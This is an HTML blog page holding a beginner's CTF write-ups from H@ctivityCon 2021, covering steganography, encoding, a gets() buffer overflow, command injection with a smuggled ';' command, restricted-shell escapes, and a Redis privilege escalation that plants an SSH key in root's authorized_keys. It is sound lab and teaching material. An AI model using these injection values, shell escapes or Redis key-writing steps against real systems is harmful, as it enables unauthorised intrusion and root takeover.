@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>H@ctivityCon 2021 - CTF Writeups - Devang Solanki</title>
+    <meta name="description" content="My first CTF competition writeups from H@ctivityCon 2021 organized by HackerOne">
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../assets/css/custom.css">
+</head>
+
+<body>
+    <div class="container">
+        <nav class="main-nav">
+            <ul>
+                <li><a href="../index.html" class="nav-home">Devang</a></li>
+                <li><a href="../blogs.html">Blogs</a></li>
+                <li><a href="../bugbounty.html">Bug Bounty</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../tools.html">Tools</a></li>
+            </ul>
+        </nav>
+
+        <div class="content-header">
+            <h1>H@ctivityCon 2021</h1>
+            <div class="content-meta">My first CTF competition writeups from H@ctivityCon organized by HackerOne</div>
+        </div>
+
+        <div class="content-body">
+            <img src="https://user-images.githubusercontent.com/75718583/134384310-731ad34c-5c4b-4ea2-93a4-bbde11ed20ef.png" alt="H@ctivityCon 2021 Logo" style="max-width: 100%; height: auto; margin: 1rem 0; border-radius: 6px;">
+
+            <p>H@cktivityCon is a conference organized by HackerOne every year. This was my first ever conference and CTF competition. Even though I had little experience with CTF (Mostly from TryHackMe) I had difficulty solving many problems. I was able to solve some entry level challenges. Here are some writeups for H@ctivityCon CTF which I was able to solve.</p>
+
+            <h2>Target Practice</h2>
+            <p>We were given a GIF file after opening we can see it has some sort of 2D barcode on it, which changes pretty quick and was looping infinitely. So I decided to slow down the GIF animation, I used <a href="https://www10.lunapic.com/editor/">lunapic</a> to slow down the animation in GIF. I knew this weird looking 2D barcode were MaxiCode. I recognized this from a video I have watched by <a href="https://www.youtube.com/user/ThioJoe">Thio Joe</a> on <a href="https://youtu.be/KMsvtqQqz5g">What Are Those Other Weird QR Codes?</a>. I quickly downloaded this <a href="https://play.google.com/store/apps/details?id=com.manateeworks.barcodescanners&hl=en_US&gl=US">Barcode Scanner</a> on my phone and started scanning all frames from the GIF. One of the frame contained this flag.</p>
+            <p><code>flag{385e3ae5d7b2ca2510be8ef4}</code></p>
+
+            <h2>2ez</h2>
+            <ul>
+                <li>We were given a file named 2ez.</li>
+                <li>I tried running <code>file 2ez</code> but didn't get any useful information.</li>
+                <li>Then I checked the file headers by using <code>hexdump -n 36 -c 2ez</code> command</li>
+            </ul>
+
+            <img src="https://user-images.githubusercontent.com/75718583/134359824-b154eb67-2f7a-4fae-ad04-ff70fab26fc3.png" alt="Hexdump output showing JFIF header" style="max-width: 100%; height: auto; margin: 1rem 0; border-radius: 6px;">
+
+            <ul>
+                <li>JFIF header means a jpeg file</li>
+                <li>Correct header for JFIF in hex is: FF D8 FF</li>
+                <li>But if we look at the file given to us it's different, so I fixed it using <code>xxd -r -p -o 0 &lt;(echo "FFD8 FEE0 0010") 2ez</code> this command</li>
+                <li>Now if we open this jpeg file it has flag in it.</li>
+            </ul>
+            <p><code>flag{812a2ca65f334ea1ab234d8af3c64d19}</code></p>
+
+            <h2>TSUNAMI</h2>
+            <ul>
+                <li>We were given a .wav audio file named tsunami.wav.</li>
+                <li>Firstly I checked the audio file with <a href="https://academo.org/demos/spectrum-analyzer/">Academo</a>.</li>
+                <li>On viewing spectrum of wav file we get flag at the end of audio file.</li>
+            </ul>
+
+            <img src="https://user-images.githubusercontent.com/75718583/134361623-9e07bb83-250e-4b3a-80fa-82d880b561ec.png" alt="Audio spectrum showing flag" style="max-width: 100%; height: auto; margin: 1rem 0; border-radius: 6px;">
+
+            <h2>Six Four Over Two</h2>
+            <p>We were given a cipher text which looked like base32 so I decoded it and got the flag</p>
+            <pre><code>┌──(kali㉿kali)-[~]
+└─$ echo "EBTGYYLHPNQTINLEGRSTOMDCMZRTIMBXGY2DKMJYGVSGIOJRGE2GMOLDGBSWM7IK" | base32 -d 
+flag{a45d4e70bfc407645185dd9114f9c0ef}</code></pre>
+
+            <h2>Bass64</h2>
+            <ul>
+                <li>We were given a text file in this challenge.</li>
+                <li>File contains letters and numbers in big ASCII art.</li>
+                <li>Which looked like this:</li>
+            </ul>
+
+            <img src="https://user-images.githubusercontent.com/75718583/134370617-c740cd92-9184-4d9a-bd5c-7441d61a0050.png" alt="ASCII art showing base64 string" style="max-width: 100%; height: auto; margin: 1rem 0; border-radius: 6px;">
+
+            <ul>
+                <li>It's actually a base64 string and converting it gives the flag.</li>
+            </ul>
+            <pre><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ echo "IGZsYWd7MzVhNWQxM2RhNmEyYWZhMGM2MmJmY2JkZDYzMDFhMGF9" | base64 -d 
+flag{35a5d13da6a2afa0c62bfcbdd6301a0a}</code></pre>
+
+            <h2>Buffer Overflow</h2>
+            <p>We were given a source code file containing the following code:</p>
+
+            <pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;sys/stat.h&gt;
+
+void give_flag();
+
+void handler(int sig) {
+    if (sig == SIGSEGV)
+        give_flag();
+}
+
+void give_flag() {
+    char *flag = NULL;
+    FILE *fp = NULL;
+    struct stat sbuf;
+
+    if ((fp = fopen("flag.txt", "r")) == NULL) {
+        puts("Could not open flag file.");
+        exit(EXIT_FAILURE);
+    }
+
+    fstat(fileno(fp), &sbuf);
+
+    flag = malloc(sbuf.st_size + 1);
+    if (flag == NULL) {
+        puts("Failed to allocate memory for the flag.");
+        exit(EXIT_FAILURE);
+    }
+
+    fread(flag, sizeof(char), sbuf.st_size, fp);
+    flag[sbuf.st_size] = '\0';
+
+    puts(flag);
+
+    fclose(fp);
+    free(flag);
+
+    exit(EXIT_SUCCESS);
+}
+
+int main() {
+    char buffer[0x200];
+
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+
+    signal(SIGSEGV, handler);
+
+    puts("How many bytes does it take to overflow this buffer?");
+    gets(buffer);
+
+    return 0;
+}</code></pre>
+
+            <p>On examining the code we can see a <code>handler()</code> function which prints flag stored in a flag.txt file somewhere on the server once the program detects segmentation fault <code>SIGSEGV</code>. For causing segmentation fault we have to overflow the buffer variable of size 0x200 (512 in decimal).</p>
+
+            <pre><code>┌──(kali㉿kali)-[~]
+└─$ nc challenge.ctf.games 30054  
+How many bytes does it take to overflow this buffer? 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+flag{72d8784a5da3a8f56d2106c12dbab989}</code></pre>
+
+            <h2>Confidentiality</h2>
+            <ul>
+                <li>This was a simple web application which was listing all the files under given directory using <code>ls -la</code> command</li>
+                <li>For exploiting this we can simply use <code>;</code> to separate our command and the system command</li>
+                <li><code>/home/user; cat /home/user/flag.txt</code></li>
+            </ul>
+
+            <img src="https://user-images.githubusercontent.com/75718583/134377008-9485de49-18dc-4e98-8324-165bc6178c85.png" alt="Command injection showing flag" style="max-width: 100%; height: auto; margin: 1rem 0; border-radius: 6px;">
+
+            <h2>Shelle</h2>
+            <p>In this challenge, we got a shell with some limitations. We can only use the 7 commands cat, ls, pwd, whoami, ps, id, echo as mentioned in the assignment.txt file.</p>
+
+            <p>Most of the characters (*, !, @, ; and others) and commands were blacklisted. After trying every possible way I noticed <code>$</code> was not blacklisted. So, I immediately entered <code>$SHELL</code> which spawned a shell for us and we got our flag.</p>
+
+            <h2>Bad Words</h2>
+            <p>In this challenge, we got a shell with strict limitation and were not allowed to run any command because they were bad. Surprisingly I tried to call command with its full path and it worked</p>
+
+            <pre><code>user@host:/home/user$ /bin/cat ./just/out/of/reach/flag.txt
+/bin/cat just/out/of/reach/flag.txt
+flag{2d43e30a358d3f30fe65cc47a9cbbe98}</code></pre>
+
+            <h2>Redlike</h2>
+            <p>This challenge was my favorite. All we got is an SSH command and a password for connecting to a remote server. Our task was to gain root access and read the flag in /root.</p>
+
+            <p>Honestly, at first I gave up this challenge because I was not able to find any lead. Then I tried running linpeas.sh and from the output I got to know there was redis.conf file. Immediately after knowing there is a redis server exposed I googled for its exploits.</p>
+
+            <p>On googling I came across this blog by <a href="https://medium.com/swlh/linux-privilege-escalation-in-four-ways-eedb52903b3">Vickie Li</a> she's my favourite blogger. In the blog she mentioned "If an attacker gains access to an overprivileged Redis instance, they can utilize Redis to escalate their privileges on the system. Attackers can use Redis to write their RSA public key to the <code>/root/.ssh/authorized_keys</code> file and gain root access through SSH."</p>
+
+            <p>As per the instruction I created my rsa keys locally:</p>
+            <pre><code>┌──(kali㉿kali)-[~]
+└─$ ssh-keygen -t rsa -b 2048</code></pre>
+
+            <p>Then pad the top and bottom of the file with newlines with this command:</p>
+            <pre><code>(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt</code></pre>
+
+            <p>Then I use redis-cli service to write the key file using:</p>
+            <pre><code>cat key.txt | redis-cli -h 127.0.0.1 -x set cmd</code></pre>
+
+            <p>Finally, we can configure Redis and write the public key file into the "authorized_keys" file in "/root/.ssh".</p>
+            <pre><code>> config set dir /root/.ssh/
+> config set dbfilename "authorized_keys"
+> save</code></pre>
+
+            <p>Now ssh as root on the machine</p>
+
+            <pre><code>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1
+Enter passphrase for key 'id_rsa':
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
+
+root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls
+flag.txt
+root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt
+flag{69dc14707af23b728ebd1363715ec890}</code></pre>
+
+            <div style="background: var(--bg-tertiary); border-left: 4px solid var(--accent-green); padding: 1rem; margin: 1rem 0; border-radius: 4px;">
+                <p><strong>Reflection:</strong> This was my first CTF competition and a great learning experience. Each challenge taught me something new about different areas of cybersecurity - from steganography and forensics to web exploitation and privilege escalation. The Redis privilege escalation was particularly interesting and something I've used in real penetration testing scenarios since then.</p>
+            </div>
+        </div>
+
+        <nav style="margin-top: 2rem;">
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../writeups.html">← Back to Writeups</a></li>
+            </ul>
+        </nav>
+    </div>
+    
+    <!-- Back to top button -->
+    <a href="#" class="back-to-top" id="backToTop">↑</a>
+    
+    <!-- Main JavaScript -->
+    <script src="../assets/js/main.js"></script>
+    
+    <script>
+        // Back to top functionality
+        const backToTop = document.getElementById('backToTop');
+        
+        window.addEventListener('scroll', () => {
+            if (window.pageYOffset > 300) {
+                backToTop.classList.add('visible');
+            } else {
+                backToTop.classList.remove('visible');
+            }
+        });
+        
+        backToTop.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body>
+</html>
